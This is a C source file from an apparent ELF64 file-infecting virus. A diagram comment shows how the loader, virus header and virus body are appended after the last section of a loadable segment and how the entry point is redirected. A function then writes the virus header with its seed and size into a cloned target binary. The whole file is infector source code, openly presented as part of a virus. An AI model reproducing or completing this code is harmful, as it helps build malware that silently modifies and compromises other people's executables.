
#include "virus.h"
#include "errors.h"
#include "utils.h"

/*
**  Elf64_packer memory overview
**  ============================
**
**                          .        .
**                          |  ...   |
**              p_offset -> |========| PT_LOAD
**                          |  ...   |
**                          |  ...   |
**             sh_offset -> |--------|
**                      |   |  ...   |
**                      V   |  ...   |
**    offset_in_section -   |>>>>>>>>| entry    - relative_entry_address
**                          |  ...   |          ^
**                          |--------|          |
**                          |  ...   |          |
**                          |  ...   |          |
**   end_of_last_section -> |--------| -  -  -  -- -  -  -  -  -  -
**         @loader_entry -> |@@@@@@@@| |                          |
**                          |@      @| |                          |
**                          |@@@@@@@@| |                          |
**  @virus_header_struct -> |UNICORNS| V                          |
**                @virus -> |~~~~~~~~| - relative_virus_addresss  |
**                          |########| |                          |
**                          |########| |                          |
**                          |########| |                          |
**                          |########| V                          V
** @_start (placeholder) -> |~~~~~~~~| - virus_size               - payload_size
**                          |  ...   |
**                          |  ...   |
**                          |========|
**                          |  ...   |
**                          .        .
**
** Note that relative_entry_address is in the opposite direction !
*/

bool		setup_virus_header(struct safe_ptr clone_ref, \
			size_t end_of_last_section,           \
			size_t full_virus_size, uint64_t seed)
{
	struct virus_header	vhdr = {
		.seed = seed,
		.full_virus_size = full_virus_size
	};

	const size_t	payload_off       = end_of_last_section;
	const size_t	dist_entry_header = (size_t)virus_header_struct - (size_t)loader_entry;
	const size_t	virus_header_off  = payload_off + dist_entry_header;

	void	*constants_location = safe(clone_ref, virus_header_off, sizeof(vhdr));

	if (!constants_location) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);

	memcpy(constants_location, &vhdr, sizeof(vhdr));

	return true;
}
